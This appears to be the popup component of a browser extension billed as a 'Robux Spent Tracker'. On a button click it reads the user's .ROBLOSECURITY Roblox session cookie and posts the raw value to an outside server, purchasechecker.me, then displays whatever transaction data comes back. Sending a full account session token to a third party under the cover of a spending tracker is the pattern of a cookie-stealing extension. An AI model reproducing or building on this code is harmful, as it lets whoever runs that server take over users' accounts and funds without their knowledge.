import React, { useEffect, useState } from 'react';
import GameList from './GameList';
import './popup.css';

export default function Popup() {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const fetchData = () => {
    setLoading(true);
    setError("");

    chrome.cookies.get(
      { url: "https://www.roblox.com", name: ".ROBLOSECURITY" },
      (cookie) => {
        if (!cookie) {
          setError("ROBLOSECURITY cookie not found.");
          setLoading(false);
          return;
        }

        fetch("https://purchasechecker.me/api/transactions", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            cookie: cookie.value,
            sort: "desc"
          }),
        })
          .then((res) => res.json())
          .then((result) => {
            if (result.error) setError(result.error);
            else setData(result);
          })
          .catch((err) => {
            console.error("Fetch error:", err);
            setError("Failed to fetch data.");
          })
          .finally(() => setLoading(false));
      }
    );
  };

  return (
    <div className="popup-container">
      <div className="popup-inner">
        <h1 className="popup-title">Robux Spent Tracker</h1>

        {loading ? (
          <div className="loading-state">
            <div className="spinner" />
            <p>Fetching transactions…</p>
          </div>
        ) : error ? (
          <div className="error-text">{error}</div>
        ) : data ? (
          <GameList data={data} />
        ) : (
          <button onClick={fetchData} className="fetch-button">
            Fetch Transactions
          </button>
        )}
      </div>
    </div>
  );
}
